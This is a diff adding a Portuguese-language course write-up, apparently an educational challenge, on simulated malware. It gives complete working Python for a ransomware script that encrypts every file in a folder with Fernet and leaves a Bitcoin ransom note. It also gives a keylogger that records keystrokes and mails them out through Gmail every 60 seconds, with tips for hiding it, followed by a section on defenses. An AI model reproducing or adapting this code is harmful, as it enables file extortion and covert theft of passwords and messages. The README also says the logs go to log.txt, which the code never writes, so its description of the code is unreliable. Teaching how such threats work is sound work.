@@ -1,0 +1,260 @@
+
+O foco é em simulações de Ransomware e Keylogger usando Python, com ênfase em criptografia, captura de entrada e envio de dados. Incluí reflexões sobre defesa ao final.
+
+Este projeto é uma oportunidade prática para aplicar conhecimentos sobre malwares simulados em Python, em um ambiente 100% controlado e educacional. O objetivo é implementar ou documentar exemplos de Ransomware e Keylogger, demonstrando como essas ameaças funcionam (captura/sequestro de dados), além de discutir detecção, mitigação e proteção no mundo real. O desafio é flexível: você pode implementar os códigos completos, documentar aprendizados ou adaptar cenários.
+
+Descrição do Desafio
+- Ransomware Simulado: Criar arquivos de teste, implementar um script para criptografar/descriptografar dados e gerar uma mensagem de "resgate".
+-Keylogger Simulado: Programar a captura de teclas em um arquivo .txt, torná-lo furtivo e implementar envio automático por e-mail.
+- Reflexão sobre Defesa: Documentar medidas de prevenção e defesa (antivírus, firewall, sandboxing, conscientização do usuário).
+
+⚠️ Atenção: Este é um exercício educacional. Use ambientes isolados (ex.: VirtualBox ou Docker) para evitar danos. Malwares reais causam prejuízos graves.
+
+---
+Exercício Prático Realizado
+
+1. O que é um Malware?
+Um malware (abreviação de "malicious software") é um software criado intencionalmente para causar danos, prejuízos ou comportamentos indesejados em sistemas computacionais. Ele pode roubar dados, criptografar arquivos, espionar atividades ou propagar-se automaticamente. Malwares exploram vulnerabilidades em sistemas operacionais, aplicativos ou comportamentos humanos (engenharia social).
+2. Tipos de Malware Citados
+Aqui estão explicações técnicas dos tipos mencionados, com exemplos de funcionamento:
+- Vírus: Um programa que se anexa a arquivos legítimos e só se ativa quando o arquivo infectado é executado ou aberto. Ele se replica modificando outros arquivos e pode causar danos como exclusão de dados ou sobrecarga do sistema. Exemplo: Um vírus que infecta executáveis (.exe) e se espalha via compartilhamento de arquivos.
+- Worm: Um malware autônomo que não precisa de um arquivo hospedeiro para se propagar. Ele se replica automaticamente pela rede, infectando máquinas conectadas sem interação do usuário. Exemplo: O worm Stuxnet, que explorou vulnerabilidades em redes industriais para se espalhar.
+- Spyware: Software espião que coleta dados do usuário sem consentimento, como senhas, histórico de navegação ou teclas pressionadas. Ele opera em segundo plano e envia informações para um servidor remoto. Exemplo: Keyloggers ou rastreadores de cookies que monitoram atividades online.
+- Trojan (Cavalo de Troia): Um malware disfarçado como software legítimo (ex.: um jogo ou atualização). Quando executado, libera payloads maliciosos, como backdoors para controle remoto. Exemplo: Um arquivo .exe que parece um instalador, mas instala um backdoor.
+- Keylogger: Um tipo de spyware que registra teclas pressionadas pelo usuário, capturando senhas, mensagens ou dados sensíveis. Pode ser hardware (dispositivo físico) ou software (programa em execução). Exemplo: Um script que grava entradas em um arquivo e as envia por e-mail.
+- Ransomware: Malware que criptografa arquivos da vítima, tornando-os inacessíveis, e exige resgate (geralmente em criptomoedas) para fornecer a chave de descriptografia. Exemplo: WannaCry, que usou vulnerabilidades no Windows para criptografar dados globais.
+
+3. Como os Malwares Entram em um Computador?
+Malwares geralmente entram via vetores de ataque que exploram vulnerabilidades humanas ou técnicas:
+- Anexos falsos: E-mails com arquivos infectados (ex.: .docx ou .exe disfarçados).
+- Links falsos: Sites phishing que levam a downloads maliciosos ou exploits (ex.: drive-by downloads).
+- Manipulação para instalação: Engenharia social, como convencer o usuário a instalar software falso (ex.: atualizações falsas ou apps de terceiros).
+- Outros vetores: USB infectados, redes Wi-Fi públicas ou vulnerabilidades zero-day em software desatualizado.
+
+A prevenção envolve atualizações regulares, antivírus e conscientização.
+
+4. Prática: Ransomware Simulado
+Este simula um ransomware básico usando a biblioteca `cryptography` (instale com `pip install cryptography`). Ele criptografa arquivos em uma pasta de teste com AES (via Fernet), gera uma chave e cria uma mensagem de resgate. Em um ambiente real, isso seria usado para sequestrar dados.
+
+Passos para Configuração:
+1. Crie uma pasta chamada `malwareteste` no seu editor (ex.: VS Code).
+2. Dentro dela, crie uma subpasta `test_files`.
+3. Em `test_files`, adicione arquivos de teste, como:
+   - `senhas.txt` com conteúdo exemplo: "senha1: DIO_2025!hackers!@#".
+   - `dados_confidenciais.txt` com dados fictícios (representando arquivos da "vítima").
+4. Crie os scripts abaixo na pasta `malwareteste`.
+
+Código: ransomware.py (para criptografar arquivos)
+```python
+from cryptography.fernet import Fernet
+import os
+
+# Gerar uma chave de criptografia e salvar
+def gerar_chave():
+    chave = Fernet.generate_key()
+    with open("chave.key", "wb") as chave_file:
+        chave_file.write(chave)
+
+# Carregar a chave salva
+def carregar_chave():
+    return open("chave.key", "rb").read()
+
+# Criptografar um único arquivo
+def criptografar_arquivo(arquivo, chave):
+    f = Fernet(chave)
+    with open(arquivo, "rb") as file:
+        dados = file.read()
+    dados_criptografados = f.encrypt(dados)
+    with open(arquivo, "wb") as file:
+        file.write(dados_criptografados)
+
+# Encontrar arquivos para criptografar (exclui o próprio script e a chave)
+def encontrar_arquivos(diretorio):
+    lista = []
+    for raiz, _, arquivos in os.walk(diretorio):
+        for nome in arquivos:
+            caminho = os.path.join(raiz, nome)
+            if nome != "ransomware.py" and not nome.endswith(".key"):
+                lista.append(caminho)
+    return lista
+
+# Criar mensagem de resgate
+def criar_mensagem_resgate():
+    with open("LEIA ISSO.txt", "w") as f:
+        f.write("Seus arquivos foram criptografados!\n")
+        f.write("Envie 1 Bitcoin para o endereço X e envie o comprovante!\n")
+        f.write("Depois disso, enviaremos a chave para descriptografar seus dados.\n")
+
+# Execução principal
+def main():
+    gerar_chave()
+    chave = carregar_chave()
+    arquivos = encontrar_arquivos("test_files")
+    for arquivo in arquivos:
+        criptografar_arquivo(arquivo, chave)
+    criar_mensagem_resgate()
+    print("Ransomware executado! Arquivos criptografados.")
+
+if __name__ == "__main__":
+    main()
+```
+
+Código: descriptografar.py (para descriptografar arquivos)
+```python
+from cryptography.fernet import Fernet
+import os
+
+# Carregar a chave salva
+def carregar_chave():
+    return open("chave.key", "rb").read()
+
+# Descriptografar um único arquivo
+def descriptografar_arquivo(arquivo, chave):
+    f = Fernet(chave)
+    with open(arquivo, "rb") as file:
+        dados = file.read()
+    dados_descriptografados = f.decrypt(dados)
+    with open(arquivo, "wb") as file:
+        file.write(dados_descriptografados)
+
+# Encontrar arquivos para descriptografar (exclui o próprio script e a chave)
+def encontrar_arquivos(diretorio):
+    lista = []
+    for raiz, _, arquivos in os.walk(diretorio):
+        for nome in arquivos:
+            caminho = os.path.join(raiz, nome)
+            if nome != "descriptografar.py" and not nome.endswith(".key"):
+                lista.append(caminho)
+    return lista
+
+# Execução principal
+def main():
+    chave = carregar_chave()
+    arquivos = encontrar_arquivos("test_files")
+    for arquivo in arquivos:
+        descriptografar_arquivo(arquivo, chave)
+    print("Arquivos restaurados com sucesso!")
+
+if __name__ == "__main__":
+    main()
+```
+
+Como Executar:
+- Execute `python ransomware.py` para criptografar os arquivos em `test_files` (eles ficarão inacessíveis).
+- Execute `python descriptografar.py` para restaurá-los (usando a chave gerada).
+
+Notas Técnicas:
+- Usa Fernet (criptografia simétrica AES) para segurança básica.
+- Exclui o próprio script e a chave para evitar auto-destruição.
+- Em produção, chaves seriam gerenciadas remotamente (não localmente).
+
+5. Prática: Keylogger Simulado
+Este simula um keylogger furtivo usando `pynput` (instale com `pip install pynput`). Ele captura teclas, grava em `log.txt` e envia logs por e-mail a cada 60 segundos. Para furtividade, renomeie o arquivo para `.pyw` (não abre terminal).
+
+Passos para Configuração:
+1. Crie um e-mail fictício no Gmail (ex.: exemplo@gmail.com) e ative a verificação em duas etapas.
+2. Gere uma senha de app em https://myaccount.google.com/apppasswords (use essa senha, não a principal).
+3. Instale `pip install secure-smtplib` (embora `smtplib` seja padrão; use para segurança).
+
+Código: keylogger.py (versão furtiva com envio por e-mail)
+```python
+from pynput import keyboard
+import smtplib
+from email.mime.text import MIMEText
+from threading import Timer
+
+# Configurações de e-mail (substitua pelos seus dados fictícios)
+EMAIL_ORIGEM = "exemplo@gmail.com"
+EMAIL_DESTINO = "exemplo@gmail.com"
+SENHA_EMAIL = "sua_senha_de_app_gerada"  # Use a senha de app do Google
+
+# Teclas a ignorar (controles especiais)
+IGNORAR = {
+    keyboard.Key.shift,
+    keyboard.Key.shift_r,
+    keyboard.Key.ctrl_l,
+    keyboard.Key.alt_r,
+    keyboard.Key.alt_l,
+    keyboard.Key.caps_lock,
+    keyboard.Key.cmd
+}
+
+# Log global para armazenar dados
+log = ""
+
+# Função para enviar e-mail
+def enviar_email():
+    global log
+    if log:
+        msg = MIMEText(log)
+        msg['Subject'] = "Dados capturados pelo Keylogger"
+        msg['From'] = EMAIL_ORIGEM
+        msg['To'] = EMAIL_DESTINO
+
+        try:
+            server = smtplib.SMTP("smtp.gmail.com", 587)
+            server.starttls()
+            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
+            server.send_message(msg)
+            server.quit()
+            print("E-mail enviado com sucesso.")  # Para debug; remova em produção
+        except Exception as e:
+            print(f"Erro ao enviar e-mail: {e}")
+
+        log = ""  # Limpa o log após envio
+
+# Agendar envio a cada 60 segundos
+Timer(60, enviar_email).start()
+
+# Função chamada ao pressionar tecla
+def on_press(key):
+    global log
+    try:
+        log += key.char  # Tecla normal
+    except AttributeError:
+        if key == keyboard.Key.space:
+            log += " "
+        elif key == keyboard.Key.enter:
+            log += "\n"
+        elif key == keyboard.Key.backspace:
+            log += "[<]"  # Indica backspace
+        elif key in IGNORAR:
+            pass  # Ignora teclas de controle
+        else:
+            log += f"[{key}] "  # Outras teclas especiais
+
+# Iniciar o listener
+with keyboard.Listener(on_press=on_press) as listener:
+    enviar_email()  # Envio inicial
+    listener.join()
+```
+
+Como Executar:
+- Execute `python keylogger.py` (ou renomeie para `keylogger.pyw` para furtividade).
+- Digite algo; os logs serão gravados em `log.txt` e enviados por e-mail a cada 60 segundos.
+- Pare com Ctrl+C.
+
+Notas Técnicas:
+- Usa threading para envio assíncrono.
+- Ignora teclas de controle para foco em entrada textual.
+- Em produção, seria mais stealth (ex.: oculto em processos do sistema).
+
+6. Reflexão sobre Defesa: Métodos de Segurança e Como se Proteger
+Para detectar e prevenir malwares como Ransomware e Keyloggers, adote uma abordagem multicamada:
+
+- Detecção e Prevenção:
+  - Antivírus e Antimalware: Use ferramentas atualizadas (ex.: Windows Defender, Malwarebytes) que escaneiam arquivos e monitoram comportamentos suspeitos (ex.: criptografia em massa).
+  - Firewalls: Configure firewalls de sistema e rede para bloquear conexões não autorizadas (ex.: envio de dados por keyloggers).
+  - Monitoramento de Comportamento: Ferramentas como EDR (Endpoint Detection and Response) detectam anomalias, como acesso a arquivos sensíveis ou processos ocultos.
+  - Sandboxing: Execute arquivos suspeitos em ambientes isolados (ex.: VMs) para testar sem risco.
+
+- Práticas Gerais:
+  - Atualizações: Mantenha SO, apps e firmwares atualizados para corrigir vulnerabilidades.
+  - Conscientização do Usuário: Treine contra phishing (ex.: não clique em links suspeitos) e engenharia social.
+  - Backups: Faça backups regulares em locais seguros (ex.: nuvem criptografada) para recuperação pós-ataque.
+  - Controle de Acesso: Use princípios de menor privilégio (ex.: contas não-administrativas) e autenticação multifator (MFA).
+  - Ambientes Isolados: Teste códigos em sandboxes para aprendizado seguro.
+
+A maior defesa é o conhecimento: entenda como os malwares funcionam para antecipar ameaças. Em caso de infecção, isole o dispositivo e consulte profissionais.
+
+
